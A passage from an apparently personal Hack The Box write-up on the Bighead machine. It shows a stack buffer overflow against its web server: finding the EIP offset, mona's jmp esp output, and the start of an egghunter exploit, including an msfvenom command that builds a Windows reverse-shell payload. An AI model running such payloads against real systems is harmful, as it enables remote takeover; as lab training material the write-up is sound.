class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span>


<span class="n">JAVASCRIPT</span> <span class="p">(</span><span class="n">unescape</span><span class="p">()</span> <span class="n">friendly</span><span class="p">)</span><span class="o">:</span>
<span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3161</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3361</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3561</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3761</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3961</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3162</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3362</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3562</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3762</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3962</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3163</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3363</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3563</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3763</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3963</span><span class="o">%</span><span class="n">u6441</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3164</span><span class="o">%</span><span class="n">u6441</span><span class="o">%</span><span class="n">u4132</span>
</code></pre></div></div>
<p>Let’s send the pattern :
<br><img src="/images/hackthebox/bighead/62.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/63.png" alt="" class="align-center"><br><br>
the EIP was overwritten with <code class="language-plaintext highlighter-rouge">ACC54AAC</code>, <code class="language-plaintext highlighter-rouge">!mona findmsp</code> should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse <code class="language-plaintext highlighter-rouge">ACC54AAC</code> because it’s <a href="http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html" target="_blank" rel="noopener noreferrer">little endian</a>, so it will be <code class="language-plaintext highlighter-rouge">AC4AC5AC</code>. I located it then I used python’s function <code class="language-plaintext highlighter-rouge">len()</code> to find the length of the string before <code class="language-plaintext highlighter-rouge">AC4AC5AC</code> :
<br><img src="/images/hackthebox/bighead/64.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/65.png" alt="" class="align-center"><br><br>
Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :
<br><img src="/images/hackthebox/bighead/66.png" alt="" class="align-center"><br><br>
And I could successfully overwrite EIP with B : 
<br><img src="/images/hackthebox/bighead/67.png" alt="" class="align-center"><br><br>
Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a <code class="language-plaintext highlighter-rouge">jmp esp</code> instruction to make it jmp to the egghunter and execute it. To do this we will use mona. <code class="language-plaintext highlighter-rouge">!mona jmp -r ESP</code>. It will create another file in <code class="language-plaintext highlighter-rouge">C:\logs</code> called <code class="language-plaintext highlighter-rouge">jmp.txt</code>. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the <code class="language-plaintext highlighter-rouge">dll</code> of the server itself <code class="language-plaintext highlighter-rouge">bHeadSvr.dll</code>. I chose the first one :
<br><img src="/images/hackthebox/bighead/68.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/69.png" alt="" class="align-center"><br><br>
Full Output :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">================================================================================</span>
  <span class="n">Output</span> <span class="n">generated</span> <span class="n">by</span> <span class="n">mona</span><span class="p">.</span><span class="n">py</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">rev</span> <span class="mi">585</span> <span class="o">-</span> <span class="n">Immunity</span> <span class="n">Debugger</span>
  <span class="n">Corelan</span> <span class="n">Team</span> <span class="o">-</span> <span class="n">https</span><span class="o">:</span><span class="c1">//www.corelan.be</span>
<span class="o">================================================================================</span>
  <span class="n">Process</span> <span class="n">being</span> <span class="n">debugged</span> <span class="o">:</span> <span class="n">BigheadWebSvr</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">5532</span><span class="p">)</span>
  <span class="n">Current</span> <span class="n">mona</span> <span class="n">arguments</span><span class="o">:</span> <span class="n">jmp</span> <span class="o">-</span><span class="n">r</span> <span class="n">ESP</span>
<span class="o">================================================================================</span>
  <span class="mi">2019</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">25</span> <span class="mo">02</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">27</span>
<span class="o">================================================================================</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="n">Module</span> <span class="n">info</span> <span class="o">:</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="n">Base</span>       <span class="o">|</span> <span class="n">Top</span>        <span class="o">|</span> <span class="n">Size</span>       <span class="o">|</span> <span class="n">Rebase</span> <span class="o">|</span> <span class="n">SafeSEH</span> <span class="o">|</span> <span class="n">ASLR</span>  <span class="o">|</span> <span class="n">NXCompat</span> <span class="o">|</span> <span class="n">OS</span> <span class="n">Dll</span> <span class="o">|</span> <span class="n">Version</span><span class="p">,</span> <span class="n">Modulename</span> <span class="o">&amp;</span> <span class="n">Path</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
 <span class="mh">0x74c70000</span> <span class="o">|</span> <span class="mh">0x74e61000</span> <span class="o">|</span> <span class="mh">0x001f1000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">KERNELBASE</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">KERNELBASE</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x771f0000</span> <span class="o">|</span> <span class="mh">0x77269000</span> <span class="o">|</span> <span class="mh">0x00079000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">sechost</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sechost</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x00400000</span> <span class="o">|</span> <span class="mh">0x00413000</span> <span class="o">|</span> <span class="mh">0x00013000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">BigheadWebSvr</span><span class="p">.</span><span class="n">exe</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">BigheadWebSvr</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span>
 <span class="mh">0x62500000</span> <span class="o">|</span> <span class="mh">0x62510000</span> <span class="o">|</span> <span class="mh">0x00010000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75510000</span> <span class="o">|</span> <span class="mh">0x755a8000</span> <span class="o">|</span> <span class="mh">0x00098000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">KERNEL32</span><span class="p">.</span><span class="n">DLL</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">KERNEL32</span><span class="p">.</span><span class="n">DLL</span><span class="p">)</span>
 <span class="mh">0x74ef0000</span> <span class="o">|</span> <span class="mh">0x74fb0000</span> <span class="o">|</span> <span class="mh">0x000c0000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x64540000</span> <span class="o">|</span> <span class="mh">0x64570000</span> <span class="o">|</span> <span class="mh">0x00030000</span> <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span> <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">False</span>  <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">[</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75270000</span> <span class="o">|</span> <span class="mh">0x752ee000</span> <span class="o">|</span> <span class="mh">0x0007e000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">ADVAPI32</span><span class="p">.</span><span class="n">DLL</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">ADVAPI32</span><span class="p">.</span><span class="n">DLL</span><span class="p">)</span>
 <span class="mh">0x776b0000</span> <span class="o">|</span> <span class="mh">0x77847000</span> <span class="o">|</span> <span class="mh">0x00197000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x77410000</span> <span class="o">|</span> <span class="mh">0x774cf000</span> <span class="o">|</span> <span class="mh">0x000bf000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">RPCRT4</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">RPCRT4</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
 <span class="mh">0x75370000</span> <span class="o">|</span> <span class="mh">0x753cf000</span> <span class="o">|</span> <span class="mh">0x0005f000</span> <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="n">True</span>    <span class="o">|</span> <span class="n">True</span>  <span class="o">|</span>  <span class="n">False</span>   <span class="o">|</span> <span class="n">True</span>   <span class="o">|</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">17763</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="n">WS2_32</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">WS2_32</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="o">-----------------------------------------------------------------------------------------------------------------------------------------</span>
<span class="mh">0x625012f0</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x625012fd</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250130a</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501317</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501324</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x62501331</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250133e</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250134b</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6250134d</span> <span class="o">:</span> <span class="n">jmp</span> <span class="n">esp</span> <span class="o">|</span> <span class="n">ascii</span> <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">bHeadSvr</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
<span class="mh">0x6455b1ca</span> <span class="o">:</span> <span class="n">push</span> <span class="n">esp</span> <span class="err">#</span> <span class="n">ret</span>  <span class="o">|</span>  <span class="p">{</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">}</span> <span class="p">[</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">]</span> <span class="n">ASLR</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">Rebase</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">SafeSEH</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">OS</span><span class="o">:</span> <span class="n">False</span><span class="p">,</span> <span class="n">v</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">bighead</span><span class="err">\</span><span class="n">BHWS_Backup</span><span class="err">\</span><span class="n">libmingwex</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span>
</code></pre></div></div>
<p>Let’s send a request to test it, 72 A’s then <code class="language-plaintext highlighter-rouge">f0125062</code> which is <code class="language-plaintext highlighter-rouge">625012f0</code> reversed:
<br><img src="/images/hackthebox/bighead/70.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/71.png" alt="" class="align-center"><br><br>
It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :
<br><img src="/images/hackthebox/bighead/72.png" alt="" class="align-center"><br><br>
Then I searched in the memory :
<br><img src="/images/hackthebox/bighead/73.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/74.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/75.png" alt="" class="align-center"><br><br>
As we can see the whole request is printed in the memory. With this information now we can write the exploit.<br></p>

<h2 id="writing-the-exploit">Writing the Exploit</h2>
<p>First thing is the imports, I imported <code class="language-plaintext highlighter-rouge">socket</code>,<code class="language-plaintext highlighter-rouge">binascii</code> and <code class="language-plaintext highlighter-rouge">re</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">re</span>
</code></pre></div></div>
<p>Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/76.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">-b '\x00'</code> is for bad chars. <code class="language-plaintext highlighter-rouge">\x00</code> which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove <code class="language-plaintext highlighter-rouge">\x</code> because we will use <code class="language-plaintext highlighter-rouge">hexlify</code> and <code class="language-plaintext highlighter-rouge">unhexlify</code> functions from <code class="language-plaintext highlighter-rouge">binascii</code>. This is for the shellcode, now we need the egghunter. I used this <a href="https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py" target="_blank" rel="noopener noreferrer">tool</a> to generate the egghunter :
<br><img src="/images/hackthebox/bighead/77.png" alt="" class="align-center"><br><br>
But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :
<br><img src="/images/hackthebox/bighead/78.png" alt="" class="align-center"><br><br>
We can easily add this to the exploit itself.<br></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">host</span> <span class="o">=</span> <span class="s">'10.10.10.112'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">egg</span> <span class="o">=</span> <span class="s">'R1ck'</span>
</code></pre></div></div>
